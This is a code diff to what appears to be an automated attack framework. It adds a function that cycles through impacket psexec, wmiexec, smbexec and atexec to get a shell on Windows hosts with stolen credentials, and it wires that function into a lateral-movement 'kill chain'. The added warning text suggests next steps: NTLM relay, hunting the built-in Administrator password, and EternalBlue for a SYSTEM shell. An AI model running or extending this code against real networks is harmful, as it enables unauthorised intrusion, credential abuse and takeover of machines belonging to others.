@@ -135,6 +135,63 @@ def dump_secrets(ip: str, user: str, password: str) -> str:
         return ""
 
 
+_UAC_FILTER_MARKERS = ("Authenticated as Guest", "rpc_s_access_denied",
+                       "Unknown DCE RPC fault status code: 00000721")
+
+
+def get_shell(ip: str, user: str, password: str) -> bool:
+    """
+    Try every available exec method to get a shell on a Windows target.
+    Handles UAC LocalAccountTokenFilterPolicy (local admin accounts are
+    downgraded to Guest on network auth unless account is built-in RID-500).
+
+    Tries in order: psexec → wmiexec → smbexec → atexec
+    Returns True if any method succeeds.
+    """
+    methods = [
+        ("impacket-psexec",   ["-service-name", "CASCADE"]),
+        ("impacket-wmiexec",  []),
+        ("impacket-smbexec",  []),
+        ("impacket-atexec",   []),
+    ]
+    uac_blocked = False
+
+    for exe_name, extra_args in methods:
+        exe = shutil.which(exe_name)
+        if not exe:
+            continue
+        tui.info(f"  Trying {exe_name} ...")
+        try:
+            out = subprocess.check_output(
+                [exe] + extra_args + [f"{user}:{password}@{ip}", "whoami"],
+                stderr=subprocess.STDOUT, text=True, timeout=30
+            )
+            if any(m in out for m in _UAC_FILTER_MARKERS):
+                uac_blocked = True
+                continue
+            if out.strip():
+                tui.success(f"Shell via {exe_name}: {out.strip()[:80]}")
+                return True
+        except subprocess.CalledProcessError as e:
+            out = e.output or ""
+            if any(m in out for m in _UAC_FILTER_MARKERS):
+                uac_blocked = True
+        except Exception:
+            pass
+
+    if uac_blocked:
+        tui.warn(
+            f"  {ip}: UAC token filter blocked all exec methods.\n"
+            f"  Windows maps non-RID-500 local accounts to Guest on network auth.\n"
+            f"  Fix options:\n"
+            f"    1. Use NTLM relay (harvest → relay attack) to get an auth token\n"
+            f"       that bypasses this.\n"
+            f"    2. Find the built-in Administrator account password.\n"
+            f"    3. If MS17-010 is present: use EternalBlue for SYSTEM shell."
+        )
+    return False
+
+
 def run_kill_chain(hosts: list[dict], creds: list[dict]) -> list[dict]:
     """
     Given discovered hosts and valid creds, attempt lateral movement
@@ -184,7 +241,14 @@ def run_kill_chain(hosts: list[dict], creds: list[dict]) -> list[dict]:
         if smb_hosts:
             tui.phase(f"SMB LATERAL — {user}")
             r = smb_exec(smb_hosts, user, pwd)
-            results += [x for x in r if x["pwned"]]
+            for x in r:
+                if x["pwned"]:
+                    results.append(x)
+                elif "Guest" in x.get("output", "") or "access_denied" in x.get("output", "").lower():
+                    # UAC token filter — escalate through all exec methods
+                    tui.warn(f"  {x['ip']}: CME auth as Guest — trying full exec chain ...")
+                    if get_shell(x["ip"], user, pwd):
+                        results.append({**x, "pwned": True})
 
         for ip in ssh_hosts:
             tui.phase(f"SSH LATERAL — {user}@{ip}")
